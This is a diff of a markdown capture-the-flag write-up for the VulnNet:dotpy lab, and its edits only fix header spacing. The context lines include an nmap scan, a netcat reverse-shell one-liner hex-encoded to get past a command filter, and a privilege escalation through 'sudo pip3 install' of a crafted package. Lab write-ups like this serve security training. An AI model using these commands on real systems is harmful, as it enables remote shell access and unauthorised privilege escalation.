@@ -1,6 +1,6 @@
-##VulnNet:dotpy
+## VulnNet:dotpy
 
-#Enumeration
+# Enumeration
 ```
 # Nmap 7.91 scan initiated Wed May  5 13:06:37 2021 as: nmap -sCV -oN nmap/initial -vvv -p 8080 10.10.57.32
 Nmap scan report for 10.10.57.32
@@ -127,7 +127,7 @@ If you haven't already been using burpsuite to send these requests, switch over 
 ```
 This works! Awesome so let's just take a normal reverse shell such as rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f, and then hex-encoded it with /x delimiters and try and replace the 'id' command with it. Sure enough we get a hit on our listener and we have a foothold
 
-#Initial Foothold
+# Initial Foothold
 Afer stabilizing our shell we are the web user and find out the following
 ```
 web@vulnnet-dotpy:~$ sudo -l
@@ -163,7 +163,7 @@ Then execute the following, to have our exploit run and our listener get a shell
 sudo -u system-adm /usr/bin/pip3 install /tmp/exploit
 ```
 
-#Privilege Escalation
+# Privilege Escalation
 We can find the user.txt flag in the system-adm home directory and then find the following,
 ```
 system-adm@vulnnet-dotpy:/tmp/pip-i1dkkxoz-build$ sudo -l
